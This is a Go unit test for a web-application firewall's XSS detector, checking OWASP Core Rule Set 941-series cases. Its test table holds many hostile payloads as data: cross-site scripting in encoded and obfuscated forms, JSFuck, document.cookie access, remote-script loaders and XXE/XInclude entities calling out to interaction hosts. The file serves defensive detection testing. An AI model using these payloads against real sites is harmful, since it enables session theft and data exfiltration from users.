package rule_941

import (
	"github.com/corazawaf/coraza-proxy-wasm/wasmplugin/core"
	"reflect"
	"strings"
	"testing"
)

func TestExperiment(t *testing.T) {

	type testCase struct {
		value string
		want  bool //期望的计算结果
	}

	testGroup := map[string]testCase{
		// 941110
		"case941110-1": {"xyz=<script >alert(1);</script>", true},
		"case941110-2": {"/?x=<script+>alert(1);</script>", true},
		"case941110-3": {"&#60;script+&#62;alert(1);&#60;/script&#62;=value", true},
		"case941110-5": {"/foo/bar%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E/", true},
		"case941110-6": {"var=%uff1cscript%u0020%uff1ealert%281%29%uff1c/script%uff1e ", true},
		"case941110-7": {"var=%ef%bc%9cscript%20%ef%bc%9ealert%281%29%ef%bc%9c/script%ef%bc%9e", true},
		//"case941110-7.a": {"var=＜script ＞alert(1)＜/script＞", true},
		"case941110-8":  {"＜script ＞alert(1)＜/script＞=value", true},
		"case941110-9":  {"&lt;script+&gt;alert(1);&lt;/script&gt", true},
		"case941110-10": {"/?%9cscript+%bcalert(1);%bc/script%9e=value", false},

		"case941130-1":  {"/char_test?mime=text/xml&body=%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%20src=%22data:,alert(1)%22%20/%3E", true},
		"case941130-2":  {"var=555-555-0199@example.com'||(select extractvalue(xmltype('<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><!DOCTYPE root [ <!ENTITY % lbsod SYSTEM \\\"http://im8vx9fw5e2ibzctphxn9vauwl2m0joncfz5nu.example'||'foo.bar/\\\">%lbsod;", true},
		"case941130-3":  {"var=<aai xmlns=\\\"http://a.b/\\\" xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" xsi:schemaLocation=\\\"http://a.b/ http://c5ipg3yqo8lcutvn8bghsptofflee424qxdq1f.examplefoo.bar/aai.xsd\\\">aai</aai>", true},
		"case941130-4":  {"var=abcd'||(select extractvalue(xmltype('<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><!DOCTYPE root [ <!ENTITY % cgger SYSTEM \\\"http://ved8pm79xruv3c46hup01827oyuzxtlx9qwjk8.example'||'foo.bar/\\\">%cgger;", true},
		"case941130-5":  {"var=<acp xmlns:xi=\\\"http://www.w3.org/2001/XInclude\\\"><xi:include href=\\\"http://sgc5rj96zows5963jrrx3544qvwtnubvzomfa4.examplefoo.bar/foo\\\"/></acp>", true},
		"case941130-6":  {"var=/active/LFI/LFI-Detection-Evaluation-POST-200Valid/content.ini'||(select extractvalue(xmltype('<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><!DOCTYPE root [ <!ENTITY % grorj SYSTEM \\\"http://yikbtpbc1uyy7f89lxt35b6as1yw1qpudm0co1.example'||'foo.bar/\\\">%grorj;", true},
		"case941130-7":  {"var=<afa xmlns=\\\"http://a.b/\\\" xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" xsi:schemaLocation=\\\"http://a.b/ http://2mpfxtfg5y22bjcdp1x79faew52420q0er1hp6.examplefoo.bar/afa.xsd\\\">afa</afa>", true},
		"case941130-8":  {"var=<chj xmlns=\\\"http://a.b/\\\" xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" xsi:schemaLocation=\\\"http://a.b/ http://1pre0sif8x51eifcs006ceddz45084w4kx7ovd.examplefoo.bar/chj.xsd\\\">chj</chj>", true},
		"case941130-9":  {"var=/content.ini'||(select extractvalue(xmltype('<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><!DOCTYPE root [ <!ENTITY % dwusu SYSTEM \\\"http://ehzrs5as0axe6v7pkdsj4r5qrhxcp6da12osch.example'||'foo.bar/\\\">%dwusu;", true},
		"case941130-10": {"var=EmptyValue'||(select extractvalue(xmltype('<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM \\\"http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/\\\">%awpsd;", true},
		"case941130-11": {"var=file:/boot.ini'||(select extractvalue(xmltype('<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><!DOCTYPE root [ <!ENTITY % cwtpc SYSTEM \\\"http://gvft67ouecbgkxlryf6litjs5jbd5htlhd43ss.example'||'foo.bar/\\\">%cwtpc;", true},
		"case941130-12": {"var=Matched Data: <!ENTITY % awfke SYSTEM found within ARGS_NAMES:1'||(select extractvalue(xmltype('<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><!DOCTYPE root [ <!ENTITY % awfke SYSTEM \\\"http://gj3tu7cu2czg8x9rmful6t7stjzcp4d812osch.example'||'foo.bar/\\\">%awfke;", true},
		"case941130-13": {"var=<oez xmlns=\\\"http://a.b/\\\" xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" xsi:schemaLocation=\\\"http://a.b/ http://eygr95rshaeenvop1d9jlrmq8hegib6bu4hx5m.examplefoo.bar/oez.xsd\\\">oez</oez>", true},
		"case941130-14": {"var=(select extractvalue(xmltype('<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><!DOCTYPE root [ <!ENTITY % anwyn SYSTEM \\\"http://y98bkp2csupyyfz9cxk3wbxaj1pzuzi26vtohd.example'||'foo.bar/\\\">%anwyn;", true},
		"case941130-15": {"var=<vqk xmlns:xi=\\\"http://www.w3.org/2001/XInclude\\\"><xi:include href=\\\"http://749kfyxln3k7toui76fcrksjeak3nybzzsmlaa.examplefoo.bar/foo\\\"/></vqk>", true},
		"case941130-16": {"var=2010-01-01'||(select extractvalue(xmltype('<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><!DOCTYPE root [ <!ENTITY % fhklu SYSTEM \\\"http://fzisa6stibffowpq2eakmsnr9ifhii6mueh45t.example'||'foo.bar/\\\">%fhklu;", true},
		"case941130-17": {"/api/v1/query?q=7XMLNS", false},
		"case941130-18": {"var=<chj%0Axmlns=\\\"http://a.b/\\\" xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" xsi:schemaLocation=\\\"http://a.b/ http://1pre0sif8x51eifcs006ceddz45084w4kx7ovd.examplefoo.bar/chj.xsd\\\">chj</chj>", true},
		// 941140
		"case941140-1": {"9411400-1=%3Cp%20style%3D%22background%3Aurl(javascript%3Aalert(1))%22%3E", true},
		"case941140-2": {"%3Cp%20style%3D%22background%3Aurl(javascript%3Aalert(1))%22%3E=941140-2", true},
		"case941140-4": {"/bar?test=x%3Dx%3Aurl%28javascript", true},
		// 941160
		"case941160-1":  {"/demo/xss/xml/vuln.xml.php?input=<script+xmlns=\"http://www.w3.org/1999/xhtml\">setTimeout(\"top.frame2.location=\"javascript:(function+()+{var+x+=+document.createElement(\\\\\"script\\\\\");x.src+=+\\\\\"//sdl.me/popup.js?//\\\\\";document.childNodes\\\\[0\\\\].appendChild(x);}());\"\",1000)</script>&//", true},
		"case941160-2":  {"/char_test?mime=text/xml&body=%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%20src=%22data:,alert(1)%22%20/%3E", true},
		"case941160-3":  {"/char_test?mime=text/xml&body=%3Cx%20onend%3D", true},
		"case941160-4":  {"/char_test?mime=text/xml&body=%22onzoom%3D", true},
		"case941160-5":  {"/char_test?mime=text/xml&body=%27formaction%3D", true},
		"case941160-6":  {"/char_test?mime=text/xml&body=%3C%20x%3A%20script", true},
		"case941160-7":  {"/char_test?mime=text/xml&body=$%3Cf%20o%20r%20m", true},
		"case941160-8":  {"OWASP ModSecurity Core Rule Set %3Cf%20o%20r%20m", true},
		"case941160-9":  {"https://coreruleset.org/?%3Cf%20o%20r%20m", true},
		"case941160-10": {"PHPSESSID%3Cf%20o%20r%20m=1234", true},
		"case941160-11": {"PHPSESSID=1234%3Cf%20o%20r%20m", true},
		"case941160-12": {"/?foo%3Cf%20o%20r%20m=bar", true},
		"case941160-13": {"/?foo=bar%3Cf%20o%20r%20m", true},
		"case941160-14": {"var='\\\"><svg/onload=(new(Image)).src='//m8vzjd10riomx3yxblmcnvaskjghsdz8xorciu7\\\\56coreruleset.org'>", true},
		"case941160-15": {"/index.php/%3Csvg/onload=alert()", true},
		// 941170
		"case941170-1": {"/char_test?mime=text/xml&body=%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%20src=%22data:,alert(1)%22%20/%3E", true},
		"case941170-2": {"payload=javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\\\"/+/onmouseover=1/+/[*/[]/+alert(1)//'></a>", true},
		"case941170-3": {"/?var=javascript:%20%5C%5C%5C%5Ct", true},
		"case941170-4": {"/?var=javascript:%5C%5C%5C%5Cu0020", true},
		"case941170-5": {"/?test=%20data%3A%20%2C%20%3Cx%3E", true},
		// 941190
		"case941190-1": {"941190-1=<STYLE>@import'http://xss.rocks/xss.css';</STYLE>", true},
		"case941190-2": {"x=<STYLE>@im\\\\port'\\\\ja\\vasc\\\\ript:alert('XSS')';</STYLE>", true},
		"case941190-3": {"<STYLE>BODY{-moz-binding:url(\"http://xss.rocks/xssmoz.xml#xss\")}</STYLE>", true},
		"case941190-4": {"My-Cookie=<STYLE>@\\\\\\\\", true},
		// 941200

		"case941200-1": {"941200-1=%3Cv%3Avmlframe%20src%3D%22foo.com%2Fsup.fml%22%2F%3E", true},
		"case941200-2": {"%3Cv%3Avmlframe%20src%3D%22foo.com%2Fsup.fml%22%2F%3E=941200-2", true},
		"case941200-3": {"%3Cv%3Avmlframe%20src%3D%22foo.com%2Fsup.fml%22%2F%3E=941200-3", true},
		"case941200-4": {"test=%3C%3Avmlframe%20src%3D", true},
		// 941210
		"case941210-1": {"941210-1=ja%26tab%3Bvascript%3A%20", true},
		"case941210-2": {"ja%26tab%3Bvascript%3A%09=941210-2", true},
		"case941210-3": {"ja%26newline%3Bvascript%3A%20=941210-3", true},
		"case941210-4": {"{\"url\":\"javascript&#10:alert(7)\"}", true},
		"case941210-5": {"{\"url\":\"jav&#13ascript:alert(7)\"}", true},

		"case941220-1": {"var=v%26newline;b%26tab;s%26newline;c%26newline;r%26tab;i%26tab;p%26newline;t%26colon;:&var2=whatever", true},
		"case941220-2": {"payload=<a href=\\\"vbscript:MsgBox+1\\\">XSS</a>", true},

		"case941230-1": {"var=<embed src=\\\"deuce.swf\\\">&var2=whatever", true},
		"case941230-2": {"payload=<embed src=\\\"javascript:alert(1)\\\"></a>", true},

		"case941240-1": {"/?var=%3c%3fimport%20implementation%20%3d", true},
		"case941240-2": {"/?test=<importimplementation=", true},

		"case941250-1": {"var=<meta http-equiv=\\\"refresh\\\"&foo=var", true},
		"case941250-2": {"payload=<meta http-equiv=\\\"refresh\\\" content=\\\"0; http://evil?</a>", true},

		"case941260-1": {"var=<meta charset=\\\"UTF-8\\\">&var2=whatever", true},
		"case941260-2": {"payload=<meta charset=\\\"UTF-7\\\" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-</a>", true},

		"case941270-1": {"/?var=%3clink%20%2f%20asdf%20href%20%20%2f%3d%20", true},
		"case941270-2": {"payload=<link href=\"xss.js\" rel=stylesheet type=\"text/javascript\"></a>", true},

		"case941280-1": {"/?var=%3cBASE%20dsfds%20HREF%20%2f%20%3d", true},
		"case941280-2": {"payload=<a href=abc style=\"width:101%;height:100%;position:absolute;font-size:1000px;\">xss<base href=\"//evil/</a>", true},

		"case941290-1": {"var=<applet code%3d\\\"deuce.class\\\">&var=whatever", true},
		"case941290-2": {"payload=<applet onreadystatechange=alert(1)></applet></a>\"", true},

		"case941300-1": {"/?%3cOBJECT%20data%20%3d=sdffdsa", true},
		"case941300-2": {"payload=<object data=\\\"javascript:alert(1)\\\"></a>", true},

		"case941310-1":  {"var=\\xbcscript\\xbealert(\\xa2XSS\\xa2)\\xbc/script\\xbe", true},
		"case941310-2":  {"var=\\xc2\\xbcscript\\xc2\\xbealert(\\xc2\\xa2XSS\\xc2\\xa2)\\xc2\\xbc/script\\xc2\\xbe", true},
		"case941310-3":  {"var=\\xd0\\xbcscript\\xd0\\xbealert(\\xc2\\xa2XSS\\xc2\\xa2)\\xd0\\xbc/script\\xd0\\xbe", true},
		"case941310-4":  {"var=\\xd0\\xb0\\xd0\\xb1\\xd0\\xb2\\xd0\\xb3\\xd0\\xb4\\xd0\\xb5\\xd1\\x91\\xd0\\xb6\\xd0\\xb7\\xd0\\xb8\\xd0\\xb9\\xd0\\xba\\xd0\\xbb\\xd0\\xbc\\xd0\\xbd\\xd0\\xbe\\xd0\\xbf\\xd1\\x80\\xd1\\x81\\xd1\\x82\\xd1\\x83\\xd1\\x84\\xd1\\x85\\xd1\\x86\\xd1\\x87\\xd1\\x88\\xd1\\x89\\xd1\\x8a\\xd1\\x8b\\xd1\\x8d\\xd1\\x8e\\xd1\\x8f", false},
		"case941310-5":  {"var=de_matten & sitzbez\\xc3\\x83\\xc2\\xbcge > fu\\xc3\\x83\\xc2\\x9fmatten_mt", false},
		"case941310-6":  {"var=\\xbc\\xbc", false},
		"case941310-7":  {"var=\\xbe\\xbe", false},
		"case941310-8":  {"var=\\xd0\\xbcscript\\xd0\\xbealert(\\xc2\\xa2XSS\\xc2\\xa2)\\xd0\\xbc/script\\xd0", false},
		"case941310-9":  {"var=\\xd0\\xbcscript\\xd0\\xbealert(\\xc2\\xa2XSS\\xc2\\xa2)\\xd0/script\\xd0\\xbe", false},
		"case941310-10": {"var=\\xd0\\xb0\\xd0\\xb1\\xd0\\xb2\\xd0\\xb3\\xd0\\xb4\\xd0\\xb5\\xd1\\x91\\xd0\\xb6\\xd0\\xb7\\xd0\\xb8\\xd0\\xb9\\xd0\\xba\\xd0\\xbb\\xd0\\xbc\\xd0\\xbd\\xd0\\xbf\\xd1\\x80\\xd1\\x81\\xd1\\x82\\xd1\\x83\\xd1\\x84\\xd1\\x85\\xd1\\x86\\xd1\\x87\\xd1\\x88\\xd1\\x89\\xd1\\x8a\\xd1\\x8b\\xd1\\x8d\\xd1\\x8e\\xd1\\x8f", false},
		"case941310-12": {"test=\\xbctest\\xbetest(\\xa2XSS\\xa2)\\xbc/test\\xbe", true},

		"case941350-1": {"/xx?id=%252bADw-script%252bAD4-", true},

		"case941360-1": {"a=[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()", true},
		"case941360-2": {"a=(![]+[])[+!+[]]", true},
		"case941360-3": {"a=+!![]", true},

		"case941370-1":  {"a=document+%2F%2Afoo%2A%2F+.+++++cookie", true},
		"case941370-2":  {"a=document%2F%2Afoo%2A%2F.%2F%2Abar%2A%2Fcookie", true},
		"case941370-3":  {"a=window%5B%22alert%22%5D%28window%5B%22document%22%5D%5B%22cookie%22%5D%29", true},
		"case941370-4":  {"a=self%5B%2F%2Afoo%2A%2F%22alert%22%5D%28self%5B%22document%22%2F%2Abar%2A%2F%5D%5B%22cookie%22%5D%29", true},
		"case941370-6":  {"a=self++%2F%2Ajhb%2A%2F++%5B++%2F%2Abar%2A%2F++%22alert%22%5D%28%22xss%22%29", true},
		"case941370-8":  {"a=self%5B%22%5Cx24%22%5D", true},
		"case941370-9":  {"a=%28document%29%5B%22cookie%22%5D", true},
		"case941370-10": {"a=%28document%2F%2Afoo%2A%2F%29%5B%22cookie%22%5D", true},

		"case941390-1": {"/?arg=setInterval%28code%2C%201%29", true},
		"case941390-2": {"/?arg=x%22%3BsetTimeout%28name%2C%201%29%2F%2F", true},
		"case941390-3": {"/?arg=eval%28%272%20%2B%202%27%29", true},
		"case941390-4": {"/?arg=new%20Function%28%29", true},
		"case941390-5": {"?arg=alert%28%29", true},
		"case941390-6": {"/?arg=atob%28%29", true},
		"case941390-7": {"/?arg=btoa%28%29", true},

		"case941400-1": {"/?xss=%5B%5D.sort.call%60%24%7Balert%7D1337%60", true},
		"case941400-2": {"/?xss=%5B%20%20%5D%20.%20sort%20.%20call%20%60%20%24%7B%20alert%20%7D%201337%20%60", true},
		"case941400-3": {"/?xss=%5B%20%20%5D%20.%20%2F%2A%2A%2F%20sort%20.%20call%20%60%20%24%7B%20alert%20%7D%201337%20%60", true},
		"case941400-4": {"/?xss=%5B%5D.map.call%60%24%7Beval%7D%5C%5Cu%7B61%7Dlert%5Cx281337%5Cx29%60", true},
		"case941400-5": {"/?xss=%5B%201234%20%5D.%20map%20.%20call%60%24%7Beval%7D%2F%2A%20asd%20%2A%2F%5C%5Cu%7B61%7Dlert%5Cx281337%5Cx29%60", true},
		"case941400-6": {"/?xss=Reflect.apply.call%60%24%7Bnavigation.navigate%7D%24%7Bnavigation%7D%24%7B%5Bname%5D%7D%60", true},
		"case941400-7": {"/?test=Reflect.sort.call%60%60", true},
	}

	for key, v := range testGroup { //遍历
		t.Run(key, func(t *testing.T) {
			tv := testTransformDefault(v.value)
			got := matchXss(tv)
			want := v.want
			if !reflect.DeepEqual(want, got) { //比较
				t.Errorf("excepted:%v, got:%v", want, got)
			}
		})
	}
}

func testTransformDefault(value string) string {
	v := value
	v, _, _ = core.Utf8ToUnicode(v)
	v, _, _ = core.UrlDecodeUni(v)
	v, _, _ = core.HtmlEntityDecode(v)
	v, _, _ = core.JsDecode(v)
	v, _, _ = core.CssDecode(v)
	v, _, _ = core.RemoveNulls(v)

	v, _, _ = core.Utf8ToUnicode(v)
	v, _, _ = core.UrlDecodeUni(v)

	return strings.ToLower(v) + " "
}
